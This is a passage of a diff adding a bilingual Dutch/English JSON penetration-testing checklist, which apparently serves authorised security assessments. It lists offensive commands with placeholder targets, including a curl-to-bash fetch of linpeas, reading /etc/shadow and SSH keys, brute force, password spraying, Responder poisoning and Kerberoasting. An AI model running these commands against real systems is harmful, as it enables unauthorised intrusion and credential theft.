+              "title": "Brute force credentials",
+              "en_title": "Brute Force Credentials",
+              "description": "Voer brute-force aanvallen uit op inlogpagina's en services.",
+              "en_description": "Perform brute-force attacks on login pages and services.",
+              "commands": [
+                "hydra -l admin -P passwords.txt TARGET ssh",
+                "hydra -l admin -P passwords.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
+              ],
+              "command_refs": [
+                "passwd_brute"
+              ],
+              "finding_refs": [
+                "Weak Credentials",
+                "Missing Account Lockout"
+              ],
+              "tools": [
+                "hydra",
+                "medusa"
+              ],
+              "mitre_attack": [
+                "T1110.001"
+              ]
+            },
+            {
+              "id": "ext_access_005",
+              "title": "Password spraying",
+              "en_title": "Password Spraying",
+              "description": "Voer password spraying uit met veelgebruikte wachtwoorden tegen meerdere accounts.",
+              "en_description": "Perform password spraying with common passwords against multiple accounts.",
+              "commands": [
+                "crackmapexec smb TARGET -u users.txt -p 'PASSWORD' --no-bruteforce"
+              ],
+              "command_refs": [
+                "passwd_spray"
+              ],
+              "finding_refs": [
+                "Weak Credentials"
+              ],
+              "tools": [
+                "crackmapexec",
+                "sprayhound"
+              ],
+              "mitre_attack": [
+                "T1110.003"
+              ]
+            },
+            {
+              "id": "ext_access_006",
+              "title": "Standaard credentials",
+              "en_title": "Default Credentials",
+              "description": "Test op standaard fabriekswachtwoorden voor gevonden services en applicaties.",
+              "en_description": "Test for factory default passwords on discovered services and applications.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "Default Credentials"
+              ],
+              "tools": [
+                "changeme",
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1078.001"
+              ]
+            },
+            {
+              "id": "ext_access_007",
+              "title": "Publieke exploit verificatie",
+              "en_title": "Public Exploit Verification",
+              "description": "Verifieer publiek beschikbare exploits voor gedetecteerde software-versies.",
+              "en_description": "Verify publicly available exploits for detected software versions.",
+              "commands": [
+                "searchsploit SERVICE",
+                "nuclei -u https://TARGET -t cves/"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Known Vulnerability"
+              ],
+              "tools": [
+                "searchsploit",
+                "nuclei",
+                "metasploit"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_access_008",
+              "title": "Phishing payload (indien in scope)",
+              "en_title": "Phishing Payload (if in scope)",
+              "description": "Bereid phishing-payloads voor als social engineering in scope is.",
+              "en_description": "Prepare phishing payloads if social engineering is in scope.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "Phishing Susceptibility"
+              ],
+              "tools": [
+                "gophish",
+                "evilginx"
+              ],
+              "mitre_attack": [
+                "T1566.001",
+                "T1566.002"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ext_postexploit",
+          "title": "Post-Exploitatie",
+          "items": [
+            {
+              "id": "ext_postexploit_001",
+              "title": "Lokale privilege escalatie",
+              "en_title": "Local Privilege Escalation",
+              "description": "Probeer lokale privileges te verhogen naar root/SYSTEM.",
+              "en_description": "Attempt to escalate local privileges to root/SYSTEM.",
+              "commands": [
+                "sudo -l",
+                "find / -perm -4000 -type f 2>/dev/null",
+                "cat /etc/crontab"
+              ],
+              "command_refs": [
+                "privesc_linux_sudo",
+                "privesc_linux_suid",
+                "privesc_linux_cron",
+                "enum_privesc_local"
+              ],
+              "finding_refs": [
+                "Local Privilege Escalation"
+              ],
+              "tools": [
+                "linpeas",
+                "winpeas"
+              ],
+              "mitre_attack": [
+                "T1068",
+                "T1548.001"
+              ]
+            },
+            {
+              "id": "ext_postexploit_002",
+              "title": "Linux enumeratie",
+              "en_title": "Linux Enumeration",
+              "description": "Voer uitgebreide systeem-enumeratie uit op Linux-hosts.",
+              "en_description": "Perform comprehensive system enumeration on Linux hosts.",
+              "commands": [
+                "curl http://IP/linpeas.sh | bash",
+                "uname -a",
+                "cat /etc/os-release"
+              ],
+              "command_refs": [
+                "enum_linux"
+              ],
+              "finding_refs": [
+                "Information Disclosure"
+              ],
+              "tools": [
+                "linpeas"
+              ],
+              "mitre_attack": [
+                "T1082"
+              ]
+            },
+            {
+              "id": "ext_postexploit_003",
+              "title": "Gevoelige data toegang",
+              "en_title": "Sensitive Data Access",
+              "description": "Zoek naar gevoelige bestanden, configuraties en credentials op het systeem.",
+              "en_description": "Search for sensitive files, configurations and credentials on the system.",
+              "commands": [
+                "find / -name '*.conf' -o -name '*.ini' -o -name '*.env' 2>/dev/null",
+                "grep -r 'password' /etc/ 2>/dev/null"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Sensitive Data Exposure",
+                "Hardcoded Credentials"
+              ],
+              "tools": [
+                "linpeas"
+              ],
+              "mitre_attack": [
+                "T1552.001"
+              ]
+            },
+            {
+              "id": "ext_postexploit_004",
+              "title": "Intern netwerk pivoting",
+              "en_title": "Internal Network Pivoting",
+              "description": "Pivot naar het interne netwerk via SSH-tunneling of SOCKS proxy.",
+              "en_description": "Pivot to the internal network via SSH tunneling or SOCKS proxy.",
+              "commands": [
+                "ssh -D 1080 user@TARGET",
+                "proxychains nmap -sT -p 445 INTERNAL_RANGE"
+              ],
+              "command_refs": [
+                "tunnel_ssh_socks"
+              ],
+              "finding_refs": [
+                "Network Segmentation Bypass"
+              ],
+              "tools": [
+                "ssh",
+                "proxychains",
+                "chisel"
+              ],
+              "mitre_attack": [
+                "T1572"
+              ]
+            },
+            {
+              "id": "ext_postexploit_005",
+              "title": "Wachtwoord/credential harvesting",
+              "en_title": "Password/Credential Harvesting",
+              "description": "Verzamel wachtwoorden en credentials van het gecompromitteerde systeem.",
+              "en_description": "Harvest passwords and credentials from the compromised system.",
+              "commands": [
+                "cat /etc/shadow",
+                "cat ~/.bash_history",
+                "find / -name 'id_rsa' 2>/dev/null"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Credential Exposure"
+              ],
+              "tools": [
+                "mimikatz",
+                "lazagne"
+              ],
+              "mitre_attack": [
+                "T1552",
+                "T1003"
+              ]
+            },
+            {
+              "id": "ext_postexploit_006",
+              "title": "Container escape assessment",
+              "en_title": "Container Escape Assessment",
+              "description": "Beoordeel of een container-escape mogelijk is vanuit Docker/Kubernetes.",
+              "en_description": "Assess whether container escape is possible from Docker/Kubernetes.",
+              "commands": [
+                "cat /proc/1/cgroup",
+                "ls /.dockerenv",
+                "mount | grep docker"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Container Escape"
+              ],
+              "tools": [
+                "deepce"
+              ],
+              "mitre_attack": [
+                "T1611"
+              ]
+            },
+            {
+              "id": "ext_postexploit_007",
+              "title": "Cloud metadata",
+              "en_title": "Cloud Metadata",
+              "description": "Probeer cloud-metadata-endpoints te benaderen voor credentials en configuratie.",
+              "en_description": "Attempt to access cloud metadata endpoints for credentials and configuration.",
+              "commands": [
+                "curl http://169.254.169.254/latest/meta-data/",
+                "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/"
+              ],
+              "command_refs": [
+                "web_ssrf_cloud"
+              ],
+              "finding_refs": [
+                "Cloud Metadata Exposure",
+                "SSRF to Cloud Metadata"
+              ],
+              "tools": [
+                "curl"
+              ],
+              "mitre_attack": [
+                "T1552.005"
+              ]
+            },
+            {
+              "id": "ext_postexploit_008",
+              "title": "Laterale beweging (indien in scope)",
+              "en_title": "Lateral Movement (if in scope)",
+              "description": "Verplaats naar andere systemen in het netwerk als dit binnen de scope valt.",
+              "en_description": "Move to other systems in the network if within scope.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "Lateral Movement Possible"
+              ],
+              "tools": [
+                "crackmapexec",
+                "psexec"
+              ],
+              "mitre_attack": [
+                "T1021"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ext_report",
+          "title": "Rapportage & Cleanup",
+          "items": [
+            {
+              "id": "ext_report_001",
+              "title": "Bewijsverzameling",
+              "en_title": "Evidence Collection",
+              "description": "Verzamel en organiseer alle bewijzen van gevonden kwetsbaarheden.",
+              "en_description": "Collect and organize all evidence of discovered vulnerabilities.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [],
+              "mitre_attack": []
+            },
+            {
+              "id": "ext_report_002",
+              "title": "Screenshot documentatie",
+              "en_title": "Screenshot Documentation",
+              "description": "Maak screenshots van alle kwetsbaarheden en succesvolle exploits.",
+              "en_description": "Take screenshots of all vulnerabilities and successful exploits.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [],
+              "mitre_attack": []
+            },
+            {
+              "id": "ext_report_003",
+              "title": "Verwijder gedeployde tools",
+              "en_title": "Cleanup Deployed Tools",
+              "description": "Verwijder alle geplaatste tools, shells en bestanden van doelsystemen.",
+              "en_description": "Remove all placed tools, shells and files from target systems.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [],
+              "mitre_attack": []
+            },
+            {
+              "id": "ext_report_004",
+              "title": "Verifieer cleanup volledigheid",
+              "en_title": "Verify Cleanup Completeness",
+              "description": "Controleer of alle artefacten volledig zijn verwijderd van doelsystemen.",
+              "en_description": "Verify all artifacts have been completely removed from target systems.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [],
+              "mitre_attack": []
+            },
+            {
+              "id": "ext_report_005",
+              "title": "Rapportgeneratie",
+              "en_title": "Report Generation",
+              "description": "Genereer het eindrapport met alle bevindingen, risicoscores en aanbevelingen.",
+              "en_description": "Generate the final report with all findings, risk scores and recommendations.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [
+                "pandoc"
+              ],
+              "mitre_attack": []
+            }
+          ]
+        }
+      ]
+    },
+    "intern": {
+      "title": "Interne pentest",
+      "en_title": "Internal Pentest",
+      "phases": [
+        {
+          "id": "int_netdisc",
+          "title": "Netwerk Discovery",
+          "items": [
+            {
+              "id": "int_netdisc_001",
+              "title": "Host discovery",
+              "en_title": "Host Discovery",
+              "description": "Ontdek actieve hosts op het interne netwerk via ping sweep en ARP scan.",
+              "en_description": "Discover active hosts on the internal network via ping sweep and ARP scan.",
+              "commands": [
+                "nmap -sn SUBNET/24",
+                "netdiscover -r SUBNET/24",
+                "arp-scan -l"
+              ],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [
+                "nmap",
+                "netdiscover",
+                "arp-scan"
+              ],
+              "mitre_attack": [
+                "T1046"
+              ]
+            },
+            {
+              "id": "int_netdisc_002",
+              "title": "Volledige poortscan",
+              "en_title": "Full Port Scan",
+              "description": "Scan alle 65535 poorten op ontdekte hosts.",
+              "en_description": "Scan all 65535 ports on discovered hosts.",
+              "commands": [
+                "nmap -sS -p- -T4 --min-rate 1000 -oA full_scan TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Unnecessary Open Ports"
+              ],
+              "tools": [
+                "nmap",
+                "masscan"
+              ],
+              "mitre_attack": [
+                "T1046"
+              ]
+            },
+            {
+              "id": "int_netdisc_003",
+              "title": "Service detectie",
+              "en_title": "Service Detection",
+              "description": "Identificeer services en versies op open poorten.",
+              "en_description": "Identify services and versions on open ports.",
+              "commands": [
+                "nmap -sV -sC -p PORTS TARGET -oA svc_scan"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Outdated Software Version"
+              ],
+              "tools": [
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1046"
+              ]
+            },
+            {
+              "id": "int_netdisc_004",
+              "title": "VLAN analyse",
+              "en_title": "VLAN Analysis",
+              "description": "Analyseer VLAN-configuratie en test op VLAN hopping.",
+              "en_description": "Analyze VLAN configuration and test for VLAN hopping.",
+              "commands": [
+                "yersinia -G"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "VLAN Hopping"
+              ],
+              "tools": [
+                "yersinia",
+                "frogger"
+              ],
+              "mitre_attack": [
+                "T1599"
+              ]
+            },
+            {
+              "id": "int_netdisc_005",
+              "title": "Netwerksegmentatie testen",
+              "en_title": "Network Segmentation Testing",
+              "description": "Test of netwerksegmentatie correct is geimplementeerd tussen zones.",
+              "en_description": "Test whether network segmentation is correctly implemented between zones.",
+              "commands": [
+                "nmap -sn OTHER_SUBNET/24",
+                "ping -c 1 GATEWAY"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Insufficient Network Segmentation"
+              ],
+              "tools": [
+                "nmap",
+                "traceroute"
+              ],
+              "mitre_attack": [
+                "T1599"
+              ]
+            },
+            {
+              "id": "int_netdisc_006",
+              "title": "Default gateway/router analyse",
+              "en_title": "Default Gateway/Router Analysis",
+              "description": "Analyseer de default gateway en routers op kwetsbaarheden en misconfiguratie.",
+              "en_description": "Analyze the default gateway and routers for vulnerabilities and misconfiguration.",
+              "commands": [
+                "traceroute TARGET",
+                "nmap -sV -p 22,23,80,443 GATEWAY"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Router Misconfiguration"
+              ],
+              "tools": [
+                "nmap",
+                "traceroute"
+              ],
+              "mitre_attack": [
+                "T1046"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_svc",
+          "title": "Service Enumeratie",
+          "items": [
+            {
+              "id": "int_svc_001",
+              "title": "SMB enumeratie",
+              "en_title": "SMB Enumeration",
+              "description": "Enumereer SMB-shares, null-sessies en SMB-signing status.",
+              "en_description": "Enumerate SMB shares, null sessions and SMB signing status.",
+              "commands": [
+                "crackmapexec smb SUBNET/24 --gen-relay-list targets.txt",
+                "smbclient -L //TARGET -N",
+                "enum4linux -a TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "SMB Null Session",
+                "SMB Signing Not Required"
+              ],
+              "tools": [
+                "crackmapexec",
+                "smbclient",
+                "enum4linux"
+              ],
+              "mitre_attack": [
+                "T1021.002",
+                "T1135"
+              ]
+            },
+            {
+              "id": "int_svc_002",
+              "title": "LDAP enumeratie",
+              "en_title": "LDAP Enumeration",
+              "description": "Enumereer LDAP-service voor domein-informatie en objecten.",
+              "en_description": "Enumerate LDAP service for domain information and objects.",
+              "commands": [
+                "ldapsearch -x -H ldap://TARGET -b 'DC=DOMAIN,DC=local'",
+                "nmap --script ldap-search -p 389 TARGET"
+              ],
+              "command_refs": [
+                "ad_enum_ldap_raw"
+              ],
+              "finding_refs": [
+                "LDAP Anonymous Bind"
+              ],
+              "tools": [
+                "ldapsearch",
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1087.002"
+              ]
+            },
+            {
+              "id": "int_svc_003",
+              "title": "Kerberos service discovery",
+              "en_title": "Kerberos Service Discovery",
+              "description": "Ontdek Kerberos-services en domeincontrollers.",
+              "en_description": "Discover Kerberos services and domain controllers.",
+              "commands": [
+                "nmap -p 88 SUBNET/24",
+                "kerbrute userenum -d DOMAIN --dc DC users.txt"
+              ],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [
+                "nmap",
+                "kerbrute"
+              ],
+              "mitre_attack": [
+                "T1558"
+              ]
+            },
+            {
+              "id": "int_svc_004",
+              "title": "MSSQL instances",
+              "en_title": "MSSQL Instances",
+              "description": "Ontdek en enumereer Microsoft SQL Server instances.",
+              "en_description": "Discover and enumerate Microsoft SQL Server instances.",
+              "commands": [
+                "nmap -p 1433 --script ms-sql-info SUBNET/24",
+                "crackmapexec mssql SUBNET/24"
+              ],
+              "command_refs": [
+                "mssql_enum"
+              ],
+              "finding_refs": [
+                "MSSQL Default Credentials",
+                "MSSQL Exposed"
+              ],
+              "tools": [
+                "nmap",
+                "crackmapexec"
+              ],
+              "mitre_attack": [
+                "T1046"
+              ]
+            },
+            {
+              "id": "int_svc_005",
+              "title": "Web services discovery",
+              "en_title": "Web Services Discovery",
+              "description": "Ontdek interne webapplicaties en management-interfaces.",
+              "en_description": "Discover internal web applications and management interfaces.",
+              "commands": [
+                "nmap -p 80,443,8080,8443 SUBNET/24 --open",
+                "aquatone -ports 80,443,8080,8443"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Internal Web Application Exposed"
+              ],
+              "tools": [
+                "nmap",
+                "aquatone"
+              ],
+              "mitre_attack": [
+                "T1046"
+              ]
+            },
+            {
+              "id": "int_svc_006",
+              "title": "NFS shares",
+              "en_title": "NFS Shares",
+              "description": "Enumereer NFS-exports op het interne netwerk.",
+              "en_description": "Enumerate NFS exports on the internal network.",
+              "commands": [
+                "showmount -e TARGET",
+                "nmap --script nfs-showmount -p 111,2049 SUBNET/24"
+              ],
+              "command_refs": [
+                "recon_nfs"
+              ],
+              "finding_refs": [
+                "NFS Unrestricted Access"
+              ],
+              "tools": [
+                "showmount",
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1135"
+              ]
+            },
+            {
+              "id": "int_svc_007",
+              "title": "SNMP enumeratie",
+              "en_title": "SNMP Enumeration",
+              "description": "Enumereer SNMP-services op het interne netwerk.",
+              "en_description": "Enumerate SNMP services on the internal network.",
+              "commands": [
+                "onesixtyone -c community.txt SUBNET/24",
+                "snmpwalk -v2c -c public TARGET"
+              ],
+              "command_refs": [
+                "recon_snmp"
+              ],
+              "finding_refs": [
+                "SNMP Default Community String"
+              ],
+              "tools": [
+                "onesixtyone",
+                "snmpwalk"
+              ],
+              "mitre_attack": [
+                "T1602.001"
+              ]
+            },
+            {
+              "id": "int_svc_008",
+              "title": "Jenkins/CI/CD",
+              "en_title": "Jenkins/CI/CD",
+              "description": "Ontdek en test Jenkins en andere CI/CD-systemen op het netwerk.",
+              "en_description": "Discover and test Jenkins and other CI/CD systems on the network.",
+              "commands": [
+                "nmap -p 8080 --script http-title SUBNET/24"
+              ],
+              "command_refs": [
+                "exploit_jenkins"
+              ],
+              "finding_refs": [
+                "Jenkins Unauthenticated Access",
+                "CI/CD Pipeline Abuse"
+              ],
+              "tools": [
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1072"
+              ]
+            },
+            {
+              "id": "int_svc_009",
+              "title": "ADIDNS enumeratie",
+              "en_title": "ADIDNS Enumeration",
+              "description": "Enumereer Active Directory-geïntegreerde DNS-zones voor verouderde of manipuleerbare records.",
+              "en_description": "Enumerate Active Directory-Integrated DNS zones for stale or manipulable records.",
+              "commands": [
+                "adidnsdump -u DOMAIN\\\\USER -p PASS DC",
+                "Get-ADIDNSZone -DomainController DC"
+              ],
+              "command_refs": [
+                "recon_adidns"
+              ],
+              "finding_refs": [
+                "ADIDNS Misconfiguration"
+              ],
+              "tools": [
+                "adidnsdump",
+                "powermad"
+              ],
+              "mitre_attack": [
+                "T1590.002"
+              ]
+            },
+            {
+              "id": "int_svc_010",
+              "title": "SCCM/MECM recon",
+              "en_title": "SCCM/MECM Reconnaissance",
+              "description": "Ontdek SCCM/MECM-infrastructuur en enumereer site servers, distribution points en NAA-accounts.",
+              "en_description": "Discover SCCM/MECM infrastructure and enumerate site servers, distribution points and NAA accounts.",
+              "commands": [
+                "SharpSCCM.exe local site-info",
+                "SharpSCCM.exe get site-info"
+              ],
+              "command_refs": [
+                "recon_sccm"
+              ],
+              "finding_refs": [
+                "SCCM Misconfiguration"
+              ],
+              "tools": [
+                "sharpsccm",
+                "sccmhunter"
+              ],
+              "mitre_attack": [
+                "T1018"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_ad",
+          "title": "Active Directory Enumeratie",
+          "items": [
+            {
+              "id": "int_ad_001",
+              "title": "Domein gebruikers",
+              "en_title": "Domain Users",
+              "description": "Enumereer alle domeingebruikers en hun eigenschappen.",
+              "en_description": "Enumerate all domain users and their properties.",
+              "commands": [
+                "Get-DomainUser | Select-Object samaccountname,description",
+                "net user /domain"
+              ],
+              "command_refs": [
+                "enum_domain_users"
+              ],
+              "finding_refs": [
+                "Excessive Domain User Information"
+              ],
+              "tools": [
+                "powerview",
+                "net"
+              ],
+              "mitre_attack": [
+                "T1087.002"
+              ]
+            },
+            {
+              "id": "int_ad_002",
+              "title": "Domein groepen",
+              "en_title": "Domain Groups",
+              "description": "Enumereer domeingroepen en hun leden, inclusief privileged groepen.",
+              "en_description": "Enumerate domain groups and their members, including privileged groups.",
+              "commands": [
+                "Get-DomainGroup | Select-Object samaccountname",
+                "Get-DomainGroupMember -Identity 'Domain Admins'"
+              ],
+              "command_refs": [
+                "enum_domain_groups"
+              ],
+              "finding_refs": [
+                "Excessive Privileged Group Members"
+              ],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1069.002"
+              ]
+            },
+            {
+              "id": "int_ad_003",
+              "title": "Domein computers",
+              "en_title": "Domain Computers",
+              "description": "Enumereer alle domein-computers en hun besturingssystemen.",
+              "en_description": "Enumerate all domain computers and their operating systems.",
+              "commands": [
+                "Get-DomainComputer | Select-Object dnshostname,operatingsystem"
+              ],
+              "command_refs": [
+                "enum_domain_computers"
+              ],
+              "finding_refs": [
+                "Unsupported Operating System"
+              ],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1018"
+              ]
+            },
+            {
+              "id": "int_ad_004",
+              "title": "Group Policy Objects",
+              "en_title": "Group Policy Objects",
+              "description": "Enumereer GPO's en zoek naar misconfiguraties en gevoelige instellingen.",
+              "en_description": "Enumerate GPOs and look for misconfigurations and sensitive settings.",
+              "commands": [
+                "Get-DomainGPO | Select-Object displayname,gpcfilesyspath"
+              ],
+              "command_refs": [
+                "enum_domain_gpo"
+              ],
+              "finding_refs": [
+                "GPO Password in SYSVOL"
+              ],
+              "tools": [
+                "powerview",
+                "grouper"
+              ],
+              "mitre_attack": [
+                "T1615"
+              ]
+            },
+            {
+              "id": "int_ad_005",
+              "title": "Domein trusts",
+              "en_title": "Domain Trusts",
+              "description": "Enumereer domein-trusts en analyseer trust-relaties.",
+              "en_description": "Enumerate domain trusts and analyze trust relationships.",
+              "commands": [
+                "Get-DomainTrust",
+                "nltest /domain_trusts"
+              ],
+              "command_refs": [
+                "enum_domain_trusts"
+              ],
+              "finding_refs": [
+                "Excessive Trust Relationships"
+              ],
+              "tools": [
+                "powerview",
+                "nltest"
+              ],
+              "mitre_attack": [
+                "T1482"
+              ]
+            },
+            {
+              "id": "int_ad_006",
+              "title": "ACL analyse",
+              "en_title": "ACL Analysis",
+              "description": "Analyseer Active Directory ACL's op gevaarlijke permissies.",
+              "en_description": "Analyze Active Directory ACLs for dangerous permissions.",
+              "commands": [
+                "Find-InterestingDomainAcl -ResolveGUIDs"
+              ],
+              "command_refs": [
+                "ad_enum_acl"
+              ],
+              "finding_refs": [
+                "Excessive AD Permissions"
+              ],
+              "tools": [
+                "powerview",
+                "bloodhound"
+              ],
+              "mitre_attack": [
+                "T1069.002"
+              ]
+            },
+            {
+              "id": "int_ad_007",
+              "title": "SPN enumeratie",
+              "en_title": "SPN Enumeration",
+              "description": "Enumereer Service Principal Names voor Kerberoasting-kandidaten.",
+              "en_description": "Enumerate Service Principal Names for Kerberoasting candidates.",
+              "commands": [
+                "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Kerberoastable Service Account"
+              ],
+              "tools": [
+                "powerview",
+                "rubeus"
+              ],
+              "mitre_attack": [
+                "T1558.003"
+              ]
+            },
+            {
+              "id": "int_ad_008",
+              "title": "BloodHound collectie",
+              "en_title": "BloodHound Collection",
+              "description": "Verzamel AD-data met SharpHound voor BloodHound-analyse.",
+              "en_description": "Collect AD data with SharpHound for BloodHound analysis.",
+              "commands": [
+                "SharpHound.exe -c All --zipfilename bh.zip",
+                "bloodhound-python -u USER -p PASS -d DOMAIN -c All"
+              ],
+              "command_refs": [
+                "ad_bloodhound_collect"
+              ],
+              "finding_refs": [],
+              "tools": [
+                "sharphound",
+                "bloodhound"
+              ],
+              "mitre_attack": [
+                "T1087.002"
+              ]
+            },
+            {
+              "id": "int_ad_009",
+              "title": "ADCS enumeratie",
+              "en_title": "ADCS Enumeration",
+              "description": "Enumereer Active Directory Certificate Services en zoek naar misbruikbare templates.",
+              "en_description": "Enumerate Active Directory Certificate Services and look for abusable templates.",
+              "commands": [
+                "Certify.exe find /vulnerable",
+                "certipy find -u USER@DOMAIN -p PASS -dc-ip DC"
+              ],
+              "command_refs": [
+                "adcs_enum"
+              ],
+              "finding_refs": [
+                "ADCS Misconfiguration"
+              ],
+              "tools": [
+                "certify",
+                "certipy"
+              ],
+              "mitre_attack": [
+                "T1649"
+              ]
+            },
+            {
+              "id": "int_ad_010",
+              "title": "Share enumeratie",
+              "en_title": "Share Enumeration",
+              "description": "Enumereer netwerkshares en zoek naar gevoelige bestanden.",
+              "en_description": "Enumerate network shares and look for sensitive files.",
+              "commands": [
+                "crackmapexec smb SUBNET/24 -u USER -p PASS --shares",
+                "Invoke-ShareFinder -Verbose"
+              ],
+              "command_refs": [
+                "enum_shares_files"
+              ],
+              "finding_refs": [
+                "Sensitive Data on Network Share"
+              ],
+              "tools": [
+                "crackmapexec",
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1135"
+              ]
+            },
+            {
+              "id": "int_ad_011",
+              "title": "PowerHuntShares",
+              "en_title": "PowerHuntShares",
+              "description": "Gebruik PowerHuntShares voor uitgebreide share-enumeratie en analyse.",
+              "en_description": "Use PowerHuntShares for extensive share enumeration and analysis.",
+              "commands": [
+                "Invoke-HuntSMBShares -Threads 20 -OutputDirectory C:\\temp"
+              ],
+              "command_refs": [
+                "enum_powerhuntshares"
+              ],
+              "finding_refs": [
+                "Excessive Share Permissions"
+              ],
+              "tools": [
+                "powerhuntshares"
+              ],
+              "mitre_attack": [
+                "T1135"
+              ]
+            },
+            {
+              "id": "int_ad_012",
+              "title": "Session hunting",
+              "en_title": "Session Hunting",
+              "description": "Zoek naar actieve sessies van privileged gebruikers op het netwerk.",
+              "en_description": "Search for active sessions of privileged users on the network.",
+              "commands": [
+                "Invoke-UserHunter -GroupName 'Domain Admins'"
+              ],
+              "command_refs": [
+                "enum_session_hunter"
+              ],
+              "finding_refs": [
+                "Privileged Session on Workstation"
+              ],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1033"
+              ]
+            },
+            {
+              "id": "int_ad_013",
+              "title": "User hunting",
+              "en_title": "User Hunting",
+              "description": "Zoek specifieke gebruikers op het netwerk voor laterale beweging.",
+              "en_description": "Hunt specific users on the network for lateral movement.",
+              "commands": [
+                "Find-DomainUserLocation -UserGroupIdentity 'Domain Admins'"
+              ],
+              "command_refs": [
+                "enum_user_hunting"
+              ],
+              "finding_refs": [],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1033"
+              ]
+            },
+            {
+              "id": "int_ad_014",
+              "title": "Foreign principals",
+              "en_title": "Foreign Principals",
+              "description": "Enumereer foreign security principals in trusted domeinen.",
+              "en_description": "Enumerate foreign security principals in trusted domains.",
+              "commands": [
+                "Get-DomainForeignGroupMember"
+              ],
+              "command_refs": [
+                "ad_foreign_principals"
+              ],
+              "finding_refs": [
+                "Foreign Principal with Excessive Access"
+              ],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1482"
+              ]
+            },
+            {
+              "id": "int_ad_015",
+              "title": "Delegation enumeratie",
+              "en_title": "Delegation Enumeration",
+              "description": "Enumereer unconstrained, constrained en resource-based constrained delegation configuraties.",
+              "en_description": "Enumerate unconstrained, constrained and resource-based constrained delegation configurations.",
+              "commands": [
+                "Get-DomainComputer -Unconstrained",
+                "Get-DomainUser -TrustedToAuth",
+                "Get-DomainComputer -TrustedToAuth"
+              ],
+              "command_refs": [
+                "enum_delegation"
+              ],
+              "finding_refs": [
+                "Unconstrained Delegation",
+                "Constrained Delegation Misconfiguration"
+              ],
+              "tools": [
+                "powerview",
+                "bloodhound"
+              ],
+              "mitre_attack": [
+                "T1550.003"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_cred",
+          "title": "Credential Access",
+          "items": [
+            {
+              "id": "int_cred_001",
+              "title": "Responder/LLMNR poisoning",
+              "en_title": "Responder/LLMNR Poisoning",
+              "description": "Gebruik Responder voor LLMNR/NBT-NS/mDNS poisoning om hashes te onderscheppen.",
+              "en_description": "Use Responder for LLMNR/NBT-NS/mDNS poisoning to intercept hashes.",
+              "commands": [
+                "responder -I eth0 -wrf",
+                "hashcat -m 5600 hashes.txt wordlist.txt"
+              ],
+              "command_refs": [
+                "cred_responder"
+              ],
+              "finding_refs": [
+                "LLMNR/NBT-NS Poisoning"
+              ],
+              "tools": [
+                "responder",
+                "hashcat"
+              ],
+              "mitre_attack": [
+                "T1557.001"
+              ]
+            },
+            {
+              "id": "int_cred_002",
+              "title": "Password spraying",
+              "en_title": "Password Spraying",
+              "description": "Voer password spraying uit tegen domeinaccounts.",
+              "en_description": "Perform password spraying against domain accounts.",
+              "commands": [
+                "crackmapexec smb DC -u users.txt -p 'PASSWORD' --no-bruteforce",
+                "Invoke-DomainPasswordSpray -Password 'PASSWORD'"
+              ],
+              "command_refs": [
+                "passwd_spray"
+              ],
+              "finding_refs": [
+                "Weak Domain Credentials"
+              ],
+              "tools": [
+                "crackmapexec",
+                "kerbrute"
+              ],
+              "mitre_attack": [
+                "T1110.003"
+              ]
+            },
+            {
+              "id": "int_cred_003",
+              "title": "Kerberoasting",
+              "en_title": "Kerberoasting",
+              "description": "Vraag TGS-tickets aan voor service accounts en crack deze offline.",
+              "en_description": "Request TGS tickets for service accounts and crack them offline.",
+              "commands": [
+                "Rubeus.exe kerberoast /outfile:hashes.txt",
+                "GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC -request"
+              ],
+              "command_refs": [
+                "kerb_kerberoast"
+              ],
+              "finding_refs": [
+                "Kerberoastable Service Account"
+              ],
+              "tools": [
+                "rubeus",
+                "impacket",
+                "hashcat"
+              ],
+              "mitre_attack": [
+                "T1558.003"
+              ]
+            },
+            {
+              "id": "int_cred_004",
+              "title": "AS-REP roasting",
+              "en_title": "AS-REP Roasting",
